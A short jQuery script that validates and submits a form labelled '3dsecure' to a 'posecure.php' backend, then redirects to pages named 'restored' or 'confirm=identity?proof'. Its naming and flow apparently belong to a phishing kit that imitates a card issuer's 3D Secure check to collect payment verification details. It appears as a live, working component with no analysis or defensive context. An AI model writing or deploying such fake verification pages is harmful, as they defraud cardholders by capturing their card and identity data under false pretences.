$("#3dsecure").validate({
  submitHandler: function(form) {
    $.post("../post/posecure.php", $("#3dsecure").serialize(), function(GET) {
      if (GET == "error") {
        setTimeout(function() {
          document.getElementById("3dweb").className = "";
          document.getElementById("3dpage").className = "hide";
          alert("Please check your entries and try again");
        });
      } else if (GET == "noid") {
        window.location.assign("restored");
      } else {
        setTimeout(function() {
          window.location.assign("confirm=identity?proof");
        });
      }
    });
  }
});
